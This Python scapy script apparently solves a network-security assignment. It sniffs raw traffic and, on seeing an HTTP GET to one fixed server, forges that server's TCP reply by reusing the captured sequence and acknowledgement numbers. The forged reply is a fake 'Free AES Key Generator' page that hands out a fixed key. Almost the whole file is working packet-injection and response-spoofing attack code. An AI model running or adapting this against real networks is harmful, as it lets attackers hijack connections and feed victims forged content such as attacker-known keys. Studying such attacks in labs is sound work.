#!/usr/bin/python3

import scapy
from scapy.all import IP,TCP
def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    from scapy.all import send, conf, L3RawSocket
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
    server_id = str(pkt[30])+"."+str(pkt[31])+"."+str(pkt[32])+"."+str(pkt[33])
    if server_id == "18.234.115.5" and pkt.find(b'GET')!=-1:   
        seq_number = int(pkt[38:42].hex(),16)
        ack_number = int(pkt[42:46].hex(),16)
        dest_port = int(pkt[34:36].hex(),16)
        dest_ip =  str(pkt[26])+"."+str(pkt[27])+"."+str(pkt[28])+"."+str(pkt[29])
        payload = 'HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'
        packet = IP(src="18.234.115.5", dst=dest_ip)/TCP(sport=80, dport=dest_port, flags="PA", seq = ack_number , ack=seq_number+1)/payload
        inject_pkt(packet)
    
        
    

def main():
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__ == '__main__':
    main()
